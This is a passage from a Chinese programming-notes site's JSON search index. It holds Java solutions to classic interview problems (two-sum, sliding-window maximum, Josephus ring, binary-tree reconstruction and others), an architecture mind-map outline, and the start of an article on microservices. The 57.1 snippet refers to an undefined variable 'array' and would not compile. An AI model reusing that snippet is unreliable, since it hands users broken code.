的两个数字","parent":"数据结构","content":"57.1 和为 S 的两个数字    题目链接    牛客网\n题目描述    在有序数组中找出两个数，使得和为给定的数 S。如果有多对数字的和等于 S，输出两个数的乘积最小的。\n解题思路    使用双指针，一个指针指向元素较小的值，一个指针指向元素较大的值。指向较小元素的指针从头向尾遍历，指向较大元素的指针从尾向头遍历。\n 如果两个指针指向元素的和 sum == target，那么这两个元素即为所求。 如果 sum \u0026gt; target，移动较大的元素，使 sum 变小一些； 如果 sum \u0026lt; target，移动较小的元素，使 sum 变大一些。  public ArrayList\u0026lt;Integer\u0026gt; FindNumbersWithSum(int[] nums, int target) { int i = 0, j = nums.length - 1; while (i \u0026lt; j) { int cur = nums[i] + array[j]; if (cur == target) return new ArrayList\u0026lt;\u0026gt;(Arrays.asList(nums[i], nums[j])); if (cur \u0026lt; target) i++; else j--; } return new ArrayList\u0026lt;\u0026gt;(); } "},{"id":111,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/57.257.2-%E5%92%8C%E4%B8%BA-S-%E7%9A%84%E8%BF%9E%E7%BB%AD%E6%AD%A3%E6%95%B0%E5%BA%8F%E5%88%97/","title":"57.2 和为 S 的连续正数序列","parent":"数据结构","content":"57.2 和为 S 的连续正数序列    题目描述    牛客网\n题目描述    输出所有和为 S 的连续正数序列。例如和为 100 的连续序列有：\n[9, 10, 11, 12, 13, 14, 15, 16] [18, 19, 20, 21, 22]。 解题思路    public ArrayList\u0026lt;ArrayList\u0026lt;Integer\u0026gt;\u0026gt; FindContinuousSequence(int sum) { ArrayList\u0026lt;ArrayList\u0026lt;Integer\u0026gt;\u0026gt; ret = new ArrayList\u0026lt;\u0026gt;(); int start = 1, end = 2; int curSum = 3; while (end \u0026lt; sum) { if (curSum \u0026gt; sum) { curSum -= start; start++; } else if (curSum \u0026lt; sum) { end++; curSum += end; } else { ArrayList\u0026lt;Integer\u0026gt; list = new ArrayList\u0026lt;\u0026gt;(); for (int i = start; i \u0026lt;= end; i++) list.add(i); ret.add(list); curSum -= start; start++; end++; curSum += end; } } return ret; } "},{"id":112,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/58.158.1-%E7%BF%BB%E8%BD%AC%E5%8D%95%E8%AF%8D%E9%A1%BA%E5%BA%8F%E5%88%97/","title":"58.1 翻转单词顺序列","parent":"数据结构","content":"58.1 翻转单词顺序列    题目描述    牛客网\n题目描述    Input: \u0026#34;I am a student.\u0026#34; Output: \u0026#34;student. a am I\u0026#34; 解题思路    先翻转每个单词，再翻转整个字符串。\n题目应该有一个隐含条件，就是不能用额外的空间。虽然 Java 的题目输入参数为 String 类型，需要先创建一个字符数组使得空间复杂度为 O(N)，但是正确的参数类型应该和原书一样，为字符数组，并且只能使用该字符数组的空间。任何使用了额外空间的解法在面试时都会大打折扣，包括递归解法。\npublic String ReverseSentence(String str) { int n = str.length(); char[] chars = str.toCharArray(); int i = 0, j = 0; while (j \u0026lt;= n) { if (j == n || chars[j] == \u0026#39; \u0026#39;) { reverse(chars, i, j - 1); i = j + 1; } j++; } reverse(chars, 0, n - 1); return new String(chars); } private void reverse(char[] c, int i, int j) { while (i \u0026lt; j) swap(c, i++, j--); } private void swap(char[] c, int i, int j) { char t = c[i]; c[i] = c[j]; c[j] = t; } "},{"id":113,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/58.258.2-%E5%B7%A6%E6%97%8B%E8%BD%AC%E5%AD%97%E7%AC%A6%E4%B8%B2/","title":"58.2 左旋转字符串","parent":"数据结构","content":"58.2 左旋转字符串    题目链接    牛客网\n题目描述    将字符串 S 从第 K 位置分隔成两个子字符串，并交换这两个子字符串的位置。\nInput: S=\u0026#34;abcXYZdef\u0026#34; K=3 Output: \u0026#34;XYZdefabc\u0026#34; 解题思路    先将 \u0026ldquo;abc\u0026rdquo; 和 \u0026ldquo;XYZdef\u0026rdquo; 分别翻转，得到 \u0026ldquo;cbafedZYX\u0026rdquo;，然后再把整个字符串翻转得到 \u0026ldquo;XYZdefabc\u0026rdquo;。\npublic String LeftRotateString(String str, int n) { if (n \u0026gt;= str.length()) return str; char[] chars = str.toCharArray(); reverse(chars, 0, n - 1); reverse(chars, n, chars.length - 1); reverse(chars, 0, chars.length - 1); return new String(chars); } private void reverse(char[] chars, int i, int j) { while (i \u0026lt; j) swap(chars, i++, j--); } private void swap(char[] chars, int i, int j) { char t = chars[i]; chars[i] = chars[j]; chars[j] = t; } "},{"id":114,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/59.59.-%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3%E7%9A%84%E6%9C%80%E5%A4%A7%E5%80%BC/","title":"59. 滑动窗口的最大值","parent":"数据结构","content":"59. 滑动窗口的最大值    题目链接    牛客网\n题目描述    给定一个数组和滑动窗口的大小，找出所有滑动窗口里数值的最大值。\n例如，如果输入数组 {2, 3, 4, 2, 6, 2, 5, 1} 及滑动窗口的大小 3，那么一共存在 6 个滑动窗口，他们的最大值分别为 {4, 4, 6, 6, 6, 5}。\n\n解题思路    维护一个大小为窗口大小的大顶堆，顶堆元素则为当前窗口的最大值。\n假设窗口的大小为 M，数组的长度为 N。在窗口向右移动时，需要先在堆中删除离开窗口的元素，并将新到达的元素添加到堆中，这两个操作的时间复杂度都为 log2M，因此算法的时间复杂度为 O(Nlog2M)，空间复杂度为 O(M)。\npublic ArrayList\u0026lt;Integer\u0026gt; maxInWindows(int[] num, int size) { ArrayList\u0026lt;Integer\u0026gt; ret = new ArrayList\u0026lt;\u0026gt;(); if (size \u0026gt; num.length || size \u0026lt; 1) return ret; PriorityQueue\u0026lt;Integer\u0026gt; heap = new PriorityQueue\u0026lt;\u0026gt;((o1, o2) -\u0026gt; o2 - o1); /* 大顶堆 */ for (int i = 0; i \u0026lt; size; i++) heap.add(num[i]); ret.add(heap.peek()); for (int i = 0, j = i + size; j \u0026lt; num.length; i++, j++) { /* 维护一个大小为 size 的大顶堆 */ heap.remove(num[i]); heap.add(num[j]); ret.add(heap.peek()); } return ret; } "},{"id":115,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/6.6.-%E4%BB%8E%E5%B0%BE%E5%88%B0%E5%A4%B4%E6%89%93%E5%8D%B0%E9%93%BE%E8%A1%A8/","title":"6. 从尾到头打印链表","parent":"数据结构","content":"6. 从尾到头打印链表    题目链接    牛客网\n题目描述    从尾到头反过来打印出每个结点的值。\n\n解题思路    1. 使用递归    要逆序打印链表 1-\u0026gt;2-\u0026gt;3（3,2,1)，可以先逆序打印链表 2-\u0026gt;3(3,2)，最后再打印第一个节点 1。而链表 2-\u0026gt;3 可以看成一个新的链表，要逆序打印该链表可以继续使用求解函数，也就是在求解函数中调用自己，这就是递归函数。\npublic ArrayList\u0026lt;Integer\u0026gt; printListFromTailToHead(ListNode listNode) { ArrayList\u0026lt;Integer\u0026gt; ret = new ArrayList\u0026lt;\u0026gt;(); if (listNode != null) { ret.addAll(printListFromTailToHead(listNode.next)); ret.add(listNode.val); } return ret; } 2. 使用头插法    头插法顾名思义是将节点插入到头部：在遍历原始链表时，将当前节点插入新链表的头部，使其成为第一个节点。\n链表的操作需要维护后继关系，例如在某个节点 node1 之后插入一个节点 node2，我们可以通过修改后继关系来实现：\nnode3 = node1.next; node2.next = node3; node1.next = node2; \n为了能将一个节点插入头部，我们引入了一个叫头结点的辅助节点，该节点不存储值，只是为了方便进行插入操作。不要将头结点与第一个节点混起来，第一个节点是链表中第一个真正存储值的节点。\n\npublic ArrayList\u0026lt;Integer\u0026gt; printListFromTailToHead(ListNode listNode) { // 头插法构建逆序链表  ListNode head = new ListNode(-1); while (listNode != null) { ListNode memo = listNode.next; listNode.next = head.next; head.next = listNode; listNode = memo; } // 构建 ArrayList  ArrayList\u0026lt;Integer\u0026gt; ret = new ArrayList\u0026lt;\u0026gt;(); head = head.next; while (head != null) { ret.add(head.val); head = head.next; } return ret; } 3. 使用栈    栈具有后进先出的特点，在遍历链表时将值按顺序放入栈中，最后出栈的顺序即为逆序。\n\npublic ArrayList\u0026lt;Integer\u0026gt; printListFromTailToHead(ListNode listNode) { Stack\u0026lt;Integer\u0026gt; stack = new Stack\u0026lt;\u0026gt;(); while (listNode != null) { stack.add(listNode.val); listNode = listNode.next; } ArrayList\u0026lt;Integer\u0026gt; ret = new ArrayList\u0026lt;\u0026gt;(); while (!stack.isEmpty()) ret.add(stack.pop()); return ret; } "},{"id":116,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/60.60.-n%E4%B8%AA%E9%AA%B0%E5%AD%90%E7%9A%84%E7%82%B9%E6%95%B0/","title":"60. n个骰子的点数","parent":"数据结构","content":"60. n 个骰子的点数    题目链接    Lintcode\n题目描述    把 n 个骰子扔在地上，求点数和为 s 的概率。\n\n解题思路    动态规划    使用一个二维数组 dp 存储点数出现的次数，其中 dp[i][j] 表示前 i 个骰子产生点数 j 的次数。\n空间复杂度：O(N2)\npublic List\u0026lt;Map.Entry\u0026lt;Integer, Double\u0026gt;\u0026gt; dicesSum(int n) { final int face = 6; final int pointNum = face * n; long[][] dp = new long[n + 1][pointNum + 1]; for (int i = 1; i \u0026lt;= face; i++) dp[1][i] = 1; for (int i = 2; i \u0026lt;= n; i++) for (int j = i; j \u0026lt;= pointNum; j++) /* 使用 i 个骰子最小点数为 i */ for (int k = 1; k \u0026lt;= face \u0026amp;\u0026amp; k \u0026lt;= j; k++) dp[i][j] += dp[i - 1][j - k]; final double totalNum = Math.pow(6, n); List\u0026lt;Map.Entry\u0026lt;Integer, Double\u0026gt;\u0026gt; ret = new ArrayList\u0026lt;\u0026gt;(); for (int i = n; i \u0026lt;= pointNum; i++) ret.add(new AbstractMap.SimpleEntry\u0026lt;\u0026gt;(i, dp[n][i] / totalNum)); return ret; } 动态规划 + 旋转数组    空间复杂度：O(N)\npublic List\u0026lt;Map.Entry\u0026lt;Integer, Double\u0026gt;\u0026gt; dicesSum(int n) { final int face = 6; final int pointNum = face * n; long[][] dp = new long[2][pointNum + 1]; for (int i = 1; i \u0026lt;= face; i++) dp[0][i] = 1; int flag = 1; /* 旋转标记 */ for (int i = 2; i \u0026lt;= n; i++, flag = 1 - flag) { for (int j = 0; j \u0026lt;= pointNum; j++) dp[flag][j] = 0; /* 旋转数组清零 */ for (int j = i; j \u0026lt;= pointNum; j++) for (int k = 1; k \u0026lt;= face \u0026amp;\u0026amp; k \u0026lt;= j; k++) dp[flag][j] += dp[1 - flag][j - k]; } final double totalNum = Math.pow(6, n); List\u0026lt;Map.Entry\u0026lt;Integer, Double\u0026gt;\u0026gt; ret = new ArrayList\u0026lt;\u0026gt;(); for (int i = n; i \u0026lt;= pointNum; i++) ret.add(new AbstractMap.SimpleEntry\u0026lt;\u0026gt;(i, dp[1 - flag][i] / totalNum)); return ret; } "},{"id":117,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/61.61.-%E6%89%91%E5%85%8B%E7%89%8C%E9%A1%BA%E5%AD%90/","title":"61. 扑克牌顺子","parent":"数据结构","content":"61. 扑克牌顺子    题目链接    NowCoder\n题目描述    五张牌，其中大小鬼为癞子，牌面为 0。判断这五张牌是否能组成顺子。\n\n解题思路    public boolean isContinuous(int[] nums) { if (nums.length \u0026lt; 5) return false; Arrays.sort(nums); // 统计癞子数量  int cnt = 0; for (int num : nums) if (num == 0) cnt++; // 使用癞子去补全不连续的顺子  for (int i = cnt; i \u0026lt; nums.length - 1; i++) { if (nums[i + 1] == nums[i]) return false; cnt -= nums[i + 1] - nums[i] - 1; } return cnt \u0026gt;= 0; } "},{"id":118,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/62.62.-%E5%9C%86%E5%9C%88%E4%B8%AD%E6%9C%80%E5%90%8E%E5%89%A9%E4%B8%8B%E7%9A%84%E6%95%B0/","title":"62. 圆圈中最后剩下的数","parent":"数据结构","content":"62. 圆圈中最后剩下的数    题目链接    NowCoder\n题目描述    让小朋友们围成一个大圈。然后，随机指定一个数 m，让编号为 0 的小朋友开始报数。每次喊到 m-1 的那个小朋友要出列唱首歌，然后可以在礼品箱中任意的挑选礼物，并且不再回到圈中，从他的下一个小朋友开始，继续 0\u0026hellip;m-1 报数 \u0026hellip;. 这样下去 \u0026hellip;. 直到剩下最后一个小朋友，可以不用表演。\n解题思路    约瑟夫环，圆圈长度为 n 的解可以看成长度为 n-1 的解再加上报数的长度 m。因为是圆圈，所以最后需要对 n 取余。\npublic int LastRemaining_Solution(int n, int m) { if (n == 0) /* 特殊输入的处理 */ return -1; if (n == 1) /* 递归返回条件 */ return 0; return (LastRemaining_Solution(n - 1, m) + m) % n; } "},{"id":119,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/63.63.-%E8%82%A1%E7%A5%A8%E7%9A%84%E6%9C%80%E5%A4%A7%E5%88%A9%E6%B6%A6/","title":"63. 股票的最大利润","parent":"数据结构","content":"63. 股票的最大利润    题目链接    Leetcode：121. Best Time to Buy and Sell Stock \n题目描述    可以有一次买入和一次卖出，买入必须在前。求最大收益。\n\n解题思路    使用贪心策略，假设第 i 轮进行卖出操作，买入操作价格应该在 i 之前并且价格最低。因此在遍历数组时记录当前最低的买入价格，并且尝试将每个位置都作为卖出价格，取收益最大的即可。\npublic int maxProfit(int[] prices) { if (prices == null || prices.length == 0) return 0; int soFarMin = prices[0]; int maxProfit = 0; for (int i = 1; i \u0026lt; prices.length; i++) { soFarMin = Math.min(soFarMin, prices[i]); maxProfit = Math.max(maxProfit, prices[i] - soFarMin); } return maxProfit; } "},{"id":120,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/64.64.-%E6%B1%82-1+2+3+...+n/","title":"64. 求 1+2+3+...+n","parent":"数据结构","content":"64. 求 1+2+3+\u0026hellip;+n    题目链接    NowCoder\n题目描述    要求不能使用乘除法、for、while、if、else、switch、case 等关键字及条件判断语句 A ? B : C。\n解题思路    使用递归解法最重要的是指定返回条件，但是本题无法直接使用 if 语句来指定返回条件。\n条件与 \u0026amp;\u0026amp; 具有短路原则，即在第一个条件语句为 false 的情况下不会去执行第二个条件语句。利用这一特性，将递归的返回条件取非然后作为 \u0026amp;\u0026amp; 的第一个条件语句，递归的主体转换为第二个条件语句，那么当递归的返回条件为 true 的情况下就不会执行递归的主体部分，递归返回。\n本题的递归返回条件为 n \u0026lt;= 0，取非后就是 n \u0026gt; 0；递归的主体部分为 sum += Sum_Solution(n - 1)，转换为条件语句后就是 (sum += Sum_Solution(n - 1)) \u0026gt; 0。\npublic int Sum_Solution(int n) { int sum = n; boolean b = (n \u0026gt; 0) \u0026amp;\u0026amp; ((sum += Sum_Solution(n - 1)) \u0026gt; 0); return sum; } "},{"id":121,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/65.65.-%E4%B8%8D%E7%94%A8%E5%8A%A0%E5%87%8F%E4%B9%98%E9%99%A4%E5%81%9A%E5%8A%A0%E6%B3%95/","title":"65. 不用加减乘除做加法","parent":"数据结构","content":"65. 不用加减乘除做加法    题目链接    NowCoder\n题目描述    写一个函数，求两个整数之和，要求不得使用 +、-、*、/ 四则运算符号。\n解题思路    a ^ b 表示没有考虑进位的情况下两数的和，(a \u0026amp; b) \u0026lt;\u0026lt; 1 就是进位。\n递归会终止的原因是 (a \u0026amp; b) \u0026lt;\u0026lt; 1 最右边会多一个 0，那么继续递归，进位最右边的 0 会慢慢增多，最后进位会变为 0，递归终止。\npublic int Add(int a, int b) { return b == 0 ? a : Add(a ^ b, (a \u0026amp; b) \u0026lt;\u0026lt; 1); } "},{"id":122,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/66.66.-%E6%9E%84%E5%BB%BA%E4%B9%98%E7%A7%AF%E6%95%B0%E7%BB%84/","title":"66. 构建乘积数组","parent":"数据结构","content":"66. 构建乘积数组    题目链接    NowCoder\n题目描述    给定一个数组 A[0, 1,\u0026hellip;, n-1]，请构建一个数组 B[0, 1,\u0026hellip;, n-1]，其中 B 中的元素 B[i]=A[0]*A[1]*\u0026hellip;*A[i-1]*A[i+1]*\u0026hellip;*A[n-1]。要求不能使用除法。\n\n解题思路    public int[] multiply(int[] A) { int n = A.length; int[] B = new int[n]; for (int i = 0, product = 1; i \u0026lt; n; product *= A[i], i++) /* 从左往右累乘 */ B[i] = product; for (int i = n - 1, product = 1; i \u0026gt;= 0; product *= A[i], i--) /* 从右往左累乘 */ B[i] *= product; return B; } "},{"id":123,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/67.67.-%E6%8A%8A%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E6%8D%A2%E6%88%90%E6%95%B4%E6%95%B0/","title":"67. 把字符串转换成整数","parent":"数据结构","content":"67. 把字符串转换成整数    题目链接    NowCoder\n题目描述    将一个字符串转换成一个整数，字符串不是一个合法的数值则返回 0，要求不能使用字符串转换整数的库函数。\nIuput: +2147483647 1a33 Output: 2147483647 0 解题思路    public int StrToInt(String str) { if (str == null || str.length() == 0) return 0; boolean isNegative = str.charAt(0) == \u0026#39;-\u0026#39;; int ret = 0; for (int i = 0; i \u0026lt; str.length(); i++) { char c = str.charAt(i); if (i == 0 \u0026amp;\u0026amp; (c == \u0026#39;+\u0026#39; || c == \u0026#39;-\u0026#39;)) /* 符号判定 */ continue; if (c \u0026lt; \u0026#39;0\u0026#39; || c \u0026gt; \u0026#39;9\u0026#39;) /* 非法输入 */ return 0; ret = ret * 10 + (c - \u0026#39;0\u0026#39;); } return isNegative ? -ret : ret; } "},{"id":124,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/68.68.-%E6%A0%91%E4%B8%AD%E4%B8%A4%E4%B8%AA%E8%8A%82%E7%82%B9%E7%9A%84%E6%9C%80%E4%BD%8E%E5%85%AC%E5%85%B1%E7%A5%96%E5%85%88/","title":"68. 树中两个节点的最低公共祖先","parent":"数据结构","content":"68. 树中两个节点的最低公共祖先    68.1 二叉查找树    题目链接    Leetcode : 235. Lowest Common Ancestor of a Binary Search Tree\n解题思路    在二叉查找树中，两个节点 p, q 的公共祖先 root 满足 root.val \u0026gt;= p.val \u0026amp;\u0026amp; root.val \u0026lt;= q.val。\n\npublic TreeNode lowestCommonAncestor(TreeNode root, TreeNode p, TreeNode q) { if (root == null) return root; if (root.val \u0026gt; p.val \u0026amp;\u0026amp; root.val \u0026gt; q.val) return lowestCommonAncestor(root.left, p, q); if (root.val \u0026lt; p.val \u0026amp;\u0026amp; root.val \u0026lt; q.val) return lowestCommonAncestor(root.right, p, q); return root; } 68.2 普通二叉树    题目链接    Leetcode : 236. Lowest Common Ancestor of a Binary Tree\n解题思路    在左右子树中查找是否存在 p 或者 q，如果 p 和 q 分别在两个子树中，那么就说明根节点就是最低公共祖先。\n\npublic TreeNode lowestCommonAncestor(TreeNode root, TreeNode p, TreeNode q) { if (root == null || root == p || root == q) return root; TreeNode left = lowestCommonAncestor(root.left, p, q); TreeNode right = lowestCommonAncestor(root.right, p, q); return left == null ? right : right == null ? left : root; } "},{"id":125,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/7.7.-%E9%87%8D%E5%BB%BA%E4%BA%8C%E5%8F%89%E6%A0%91/","title":"7. 重建二叉树","parent":"数据结构","content":"7. 重建二叉树    题目链接    牛客网\n题目描述    根据二叉树的前序遍历和中序遍历的结果，重建出该二叉树。假设输入的前序遍历和中序遍历的结果中都不含重复的数字。\n\n解题思路    前序遍历的第一个值为根节点的值，使用这个值将中序遍历结果分成两部分，左部分为树的左子树中序遍历结果，右部分为树的右子树中序遍历的结果。然后分别对左右子树递归地求解。\n\n// 缓存中序遍历数组每个值对应的索引 private Map\u0026lt;Integer, Integer\u0026gt; indexForInOrders = new HashMap\u0026lt;\u0026gt;(); public TreeNode reConstructBinaryTree(int[] pre, int[] in) { for (int i = 0; i \u0026lt; in.length; i++) indexForInOrders.put(in[i], i); return reConstructBinaryTree(pre, 0, pre.length - 1, 0); } private TreeNode reConstructBinaryTree(int[] pre, int preL, int preR, int inL) { if (preL \u0026gt; preR) return null; TreeNode root = new TreeNode(pre[preL]); int inIndex = indexForInOrders.get(root.val); int leftTreeSize = inIndex - inL; root.left = reConstructBinaryTree(pre, preL + 1, preL + leftTreeSize, inL); root.right = reConstructBinaryTree(pre, preL + leftTreeSize + 1, preR, inL + leftTreeSize + 1); return root; } "},{"id":126,"href":"/system-design/website-architecture/88-%E5%BC%A0%E5%9B%BE%E8%AF%BB%E6%87%82%E5%A4%A7%E5%9E%8B%E7%BD%91%E7%AB%99%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/","title":"8 张图读懂大型网站技术架构","parent":"website-architecture","content":" 本文是作者读 《大型网站技术架构》所做的思维导图，在这里分享给各位，公众号(JavaGuide)后台回复：“架构”。即可获得下面图片的源文件以及思维导图源文件！\n  1. 大型网站架构演化 2. 大型架构模式 3. 大型网站核心架构要素 4. 瞬时响应:网站的高性能架构 5. 万无一失:网站的高可用架构 6. 永无止境:网站的伸缩性架构 7. 随机应变:网站的可扩展性架构 8. 固若金汤:网站的安全机构  1. 大型网站架构演化    2. 大型架构模式    3. 大型网站核心架构要素    4. 瞬时响应:网站的高性能架构    5. 万无一失:网站的高可用架构    6. 永无止境:网站的伸缩性架构    7. 随机应变:网站的可扩展性架构    8. 固若金汤:网站的安全机构    "},{"id":127,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/8.8.-%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E4%B8%8B%E4%B8%80%E4%B8%AA%E7%BB%93%E7%82%B9/","title":"8. 二叉树的下一个结点","parent":"数据结构","content":"8. 二叉树的下一个结点    题目链接    牛客网\n题目描述    给定一个二叉树和其中的一个结点，请找出中序遍历顺序的下一个结点并且返回 。注意，树中的结点不仅包含左右子结点，同时包含指向父结点的指针。\npublic class TreeLinkNode { int val; TreeLinkNode left = null; TreeLinkNode right = null; TreeLinkNode next = null; // 指向父结点的指针  TreeLinkNode(int val) { this.val = val; } } 解题思路    我们先来回顾一下中序遍历的过程：先遍历树的左子树，再遍历根节点，最后再遍历右子树。所以最左节点是中序遍历的第一个节点。\nvoid traverse(TreeNode root) { if (root == null) return; traverse(root.left); visit(root); traverse(root.right); } \n① 如果一个节点的右子树不为空，那么该节点的下一个节点是右子树的最左节点；\n\n② 否则，向上找第一个左链接指向的树包含该节点的祖先节点。\n\npublic TreeLinkNode GetNext(TreeLinkNode pNode) { if (pNode.right != null) { TreeLinkNode node = pNode.right; while (node.left != null) node = node.left; return node; } else { while (pNode.next != null) { TreeLinkNode parent = pNode.next; if (parent.left == pNode) return parent; pNode = pNode.next; } } return null; } "},{"id":128,"href":"/%E7%AC%94%E8%AE%B0/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/9.9.-%E7%94%A8%E4%B8%A4%E4%B8%AA%E6%A0%88%E5%AE%9E%E7%8E%B0%E9%98%9F%E5%88%97/","title":"9. 用两个栈实现队列","parent":"数据结构","content":"9. 用两个栈实现队列    题目链接    牛客网\n题目描述    用两个栈来实现一个队列，完成队列的 Push 和 Pop 操作。\n解题思路    in 栈用来处理入栈（push）操作，out 栈用来处理出栈（pop）操作。一个元素进入 in 栈之后，出栈的顺序被反转。当元素要出栈时，需要先进入 out 栈，此时元素出栈顺序再一次被反转，因此出栈顺序就和最开始入栈顺序是相同的，先进入的元素先退出，这就是队列的顺序。\n\nStack\u0026lt;Integer\u0026gt; in = new Stack\u0026lt;Integer\u0026gt;(); Stack\u0026lt;Integer\u0026gt; out = new Stack\u0026lt;Integer\u0026gt;(); public void push(int node) { in.push(node); } public int pop() throws Exception { if (out.isEmpty()) while (!in.isEmpty()) out.push(in.pop()); if (out.isEmpty()) throw new Exception(\u0026#34;queue is empty\u0026#34;); return out.pop(); } "},{"id":129,"href":"/%E5%BE%AE%E8%BD%AF%E6%9C%8D%E5%8A%A1/advantages-and-disadvantages-of-microservice/","title":"advantages-and-disadvantages-of-microservice","parent":"微软服务","content":"开发单体式应用    假设你正准备开发一款与 Uber 和 Hailo 竞争的出租车调度软件，经过初步会议和需求分析，你可能会手动或者使用基于 Rails、Spring Boot、Play 或者 Maven 的生成器开始这个新项目，它的六边形架构是模块化的 ，架构图如下：\n应用核心是业务逻辑，由定义服务、域对象和事件的模块完成。围绕着核心的是与外界打交道的适配器。适配器包括数据库访问组件、生产和处理消息的消息组件，以及提供 API 或者 UI 访问支持的 web 模块等。\n尽管也是模块化逻辑，但是最终它还是会打包并部署为单体式应用。具体的格式依赖于应用语言和框架。例如，许多 Java 应用会被打包为 WAR 格式， 部署在 Tomcat 或者 Jetty 上，而另外一些 Java 应用会被打包成自包含的 JAR 格式，同样，Rails 和 Node.js 会被打包成层级目录。\n这种应用开发风格很常见，因为 IDE 和其它工具都擅长开发一个简单应用，这类应用也很易于调试，只需要简单运行此应用，用 Selenium 链接 UI 就可以完成端到端测试。单体式应用也易于部署，只需要把打包应用拷贝到服务器端，通过在负载均衡器后端运行多个拷贝就可以轻松实现应用扩展。在早期这 类应用运行的很好。\n单体式应用的不足    不幸的是，这种简单方法却有很大的局限性。一个简单的应用会随着时间推移逐渐变大。在每次的 sprint 中， 开发团队都会面对新“故事”，然后开发许多新代码。几年后，这个小而简单的应用会变成了一个巨大的怪物。这儿有一个例子，我最近和一个开发者讨论，他正在 写一个工具，用来分析他们一个拥有数百万行代码的应用中 JAR 文件之间的依赖关系。我很确信这个代码正是很多开发者经过多年努力开发出来的一个怪物。\n一旦你的应用变成一个又大又复杂的怪物，那开发团队肯定很痛苦。敏捷开发和部署举步维艰，其中最主要问题就是这个应用太复杂，以至于任何单个开发 者都不可能搞懂它。因此，修正 bug 和正确的添加新功能变的非常困难，并且很耗时。另外，团队士气也会走下坡路。如果代码难于理解，就不可能被正确的修 改。最终会走向巨大的、不可理解的泥潭。\n单体式应用也会降低开发速度。应用越大，启动时间会越长。比如，最近的一个调查表明，有时候应用的启动时间居然超过了 12 分钟。我还听说某些应用需要 40 分钟启动时间。如果开发者需要经常重启应用，那么大部分时间就要在等待中渡过，生产效率受到极大影响。\n另外，复杂而巨大的单体式应用也不利于持续性开发。今天，SaaS 应用常态就是每天会改变很多次，而这对于单体式应用模式非常困难。另外，这种变化带来的影响并没有很好的被理解，所以不得不做很多手工测试。那么接下来，持续部署也会很艰难。\n单体式应用在不同模块发生资源冲突时，扩展将会非常困难。比如，一个模块完成一个 CPU 敏感逻辑，应该部署在 AWS EC2 Compute Optimized instances，而另外一个内存数据库模块更合适于 EC2 Memory-optimized instances。然而，由于这些模块部署在一起，因此不得不在硬件选择上做一个妥协。\n单体式应用另外一个问题是可靠性。因为所有模块都运行在一个进程中，任何一个模块中的一个 bug，比如内存泄露，将会有可能弄垮整个进程。除此之外，因为所有应用实例都是唯一的，这个 bug 将会影响到整个应用的可靠性。\n最后，单体式应用使得采用新架构和语言非常困难。比如，设想你有两百万行采用 XYZ 框架写的代码。如果想改成 ABC 框架，无论是时间还是成本都是非常昂贵的，即使 ABC 框架更好。因此，这是一个无法逾越的鸿沟。你不得不在最初选择面前低头。\n总结一下：一开始你有一个很成功的关键业务应用，后来就变成了一个巨大的，无法理解的怪物。因为采用过时的，效率低的技术，使得雇佣有潜力的开发者很困难。应用无法扩展，可靠性很低，最终，敏捷性开发和部署变的无法完成。\n那么如何应对呢？\n微处理架构——处理复杂事物    许多公司，比如 Amazon、eBay 和 NetFlix，通过采用微处理结构模式解决了上述问题。其思路不是开发一个巨大的单体式的应用，而是将应用分解为小的、互相连接的微服务。\n一个微服务一般完成某个特定的功能，比如下单管理、客户管理等等。每一个微服务都是微型六角形应用，都有自己的业务逻辑和适配器。一些微服务还会 发布 API 给其它微服务和应用客户端使用。其它微服务完成一个 Web UI，运行时，每一个实例可能是一个云 VM 或者是 Docker 容器。\n比如，一个前面描述系统可能的分解如下：\n每一个应用功能区都使用微服务完成，另外，Web 应用会被拆分成一系列简单的 Web 应用（比如一个对乘客，一个对出租车驾驶员）。这样的拆分对于不同用户、设备和特殊应用场景部署都更容易。\n每一个后台服务开放一个 REST API，许多服务本身也采用了其它服务提供的 API。比如，驾驶员管理使用了告知驾驶员一个潜在需求的通知服务。UI 服务激活其它服务来更新 Web 页面。所有服务都是采用异步的，基于消息的通讯。微服务内部机制将会在后续系列中讨论。\n一些 REST API 也对乘客和驾驶员采用的移动应用开放。这些应用并不直接访问后台服务，而是通过 API Gateway 来传递中间消息。API Gateway 负责负载均衡、缓存、访问控制、API 计费监控等等任务，可以通过 NGINX 方便实现，后续文章将会介绍到 API Gateway。\n微服务架构模式在上图中对应于代表可扩展 Scale Cube 的 Y 轴，这是一个在《The Art of Scalability》书中描述过的三维扩展模型。另外两个可扩展轴，X 轴由负载均衡器后端运行的多个应用副本组成，Z 轴是将需求路由到相关服务。\n应用基本可以用以上三个维度来表示，Y 轴代表将应用分解为微服务。运行时，X 轴代表运行多个隐藏在负载均衡器之后的实例，提供吞吐能力。一些应用可能还是用 Z 